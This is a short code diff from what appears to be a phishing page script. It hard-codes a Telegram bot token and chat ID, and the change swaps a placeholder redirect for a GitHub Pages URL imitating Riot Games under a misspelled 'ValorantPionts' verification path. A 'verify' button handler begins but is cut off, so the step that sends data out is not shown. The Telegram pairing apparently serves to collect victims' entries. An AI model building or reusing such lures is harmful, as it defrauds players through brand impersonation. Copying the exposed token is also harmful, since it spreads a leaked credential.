@@ -1,7 +1,7 @@
 document.addEventListener("DOMContentLoaded", function() {
     const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // Your bot token
     const chatId = "6687453395"; // Your Telegram Chat ID
-    const redirectUrl = "https://example.com"; // Change this to the page you want to redirect to
+    const redirectUrl = "https://riotgames0.github.io/Verification/ValorantPionts/index.html"; // Change this to the page you want to redirect to
     const verifyBtn = document.getElementById("verify-btn");
 
     verifyBtn.addEventListener("click", function() {
